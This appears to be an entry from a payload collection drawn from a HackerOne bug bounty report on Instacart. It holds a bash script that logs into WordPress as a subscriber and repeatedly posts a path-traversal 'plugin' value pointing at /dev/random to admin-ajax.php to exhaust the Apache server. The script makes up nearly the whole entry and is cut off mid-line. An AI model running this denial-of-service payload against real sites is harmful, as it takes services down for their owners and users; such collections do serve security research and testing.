# Instacart

1 payloads.

### `0584761d`

```
#!/bin/bash
target="http://<target>"
username="subscriber"
password="password"
cookiejar=$(mktemp)
   
# login
curl --cookie-jar "$cookiejar" \
   --data "log=$username&pwd=$password&wp-submit=Log+In&redirect_to=%2f&testcookie=1" \
   "$target/wp-login.php" \
   >/dev/null 2>&1
   
# exhaust apache
for i in `seq 1 1000`
   do
      curl --cookie "$cookiejar" \
      --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" \
      "$target/wp-admin/admin-ajax.php" \
      >/d
```

**Parameter:** `plugin`
— [WordPress Authentication Denial of Service](https://hackerone.com/reports/163307) · Instacart · [clizsec](https://hackerone.com/clizsec) · $100.0
